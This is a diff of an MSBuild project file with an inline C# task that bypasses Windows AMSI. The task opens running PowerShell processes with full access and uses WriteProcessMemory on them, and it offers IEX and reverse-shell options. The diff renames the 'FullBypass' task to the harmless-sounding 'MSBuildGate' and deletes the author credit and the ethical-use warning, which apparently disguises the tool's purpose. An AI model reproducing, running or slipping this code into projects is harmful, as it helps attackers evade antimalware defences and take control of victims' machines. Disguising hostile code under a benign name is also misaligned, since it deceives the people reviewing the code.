@@ -1,9 +1,9 @@
 <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
-	<Target Name="Bypass">
-		<FullBypass />
+	<Target Name="MSBuildGate">
+		<MSBuildGate />
 	</Target>
 	<UsingTask
-		TaskName="FullBypass"
+		TaskName="MSBuildGate"
 		TaskFactory="CodeTaskFactory"
 		AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
 		<Task>
@@ -21,7 +21,7 @@
 				using System.Management.Automation;
 				using System.Management.Automation.Runspaces;
 				
-				public class FullBypass : Task, ITask
+				public class MSBuildGate : Task, ITask
 				{
 
 					[DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
@@ -36,13 +36,8 @@
 					[DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
 					public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint dwSize, out int lpNumberOfBytesWritten);
 
-
 					public static int BypassAMSI()
 					{
-						Console.WriteLine("Author: Shelldon");
-						Console.WriteLine("github: github.com/Sh3lldon");
-						Console.WriteLine("!!!! Please do not use in unethical hacking and follow all rules and regulations of laws!!!!");
-
 						Process[] processes = Process.GetProcessesByName("powershell");
 						if (processes.Length != 0)
 						{
@@ -59,7 +54,6 @@
 						bool res = false;
 						for (int l = 0; l < processes.Length; l++)
 						{
-
 							id++;
 							Console.WriteLine("#" + id);
 							IntPtr hHandle = OpenProcess(0x001F0FFF, false, processes[l].Id);
@@ -159,6 +153,7 @@
 					{
 
 	                    Console.WriteLine("Press a key and Enter (10s timeout)");
+                        
 	                    Console.WriteLine("1 -> Use Powershell console");
 	                    Console.WriteLine("2 -> Use IEX");
 	                    Console.WriteLine("3 -> Use ReverShell");
